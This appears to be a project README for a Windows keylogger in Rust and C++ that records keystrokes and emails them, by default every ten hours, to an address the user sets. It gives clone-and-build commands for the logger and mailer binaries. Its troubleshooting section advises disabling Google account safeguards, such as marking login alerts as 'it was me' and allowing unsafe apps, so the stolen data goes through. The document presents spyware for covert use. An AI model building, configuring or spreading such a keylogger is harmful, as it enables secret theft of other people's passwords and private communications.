# keylogger
A Keylogger written in Rust and C++

# Compatibility
This logger only works on windows, but the email sender is made in Rust, therefore being cross-platform

# Building

firstly clone the repo:

```
git clone https://github.com/Octalbyte/tiny-keylogger
cd tiny-keylogger
```

then config the files:

`main.rs` -> fix the addresses according to your email
`logger.cpp` -> time settings (default send every ten hours) 


then build it for cargo:

```cargo build --release```

copy the binary at `./target/release` to `./src` and call it mail.exe


then build the `cpp` file:

```
g++ logger.cpp -o lg.exe
```

# Troubleshooting

if you get runtime issues (5.7.8 or 5.7.14)

- allow new loggins `https://g.co/allowaccess`
- mark all "attempted login alerts" as "it was me"
- allow unsafe apps

# "pLEaSE SeND ThE CoMpIlEd vErSIon"

No, anyone with a decent knowledge of general coding can build it. 
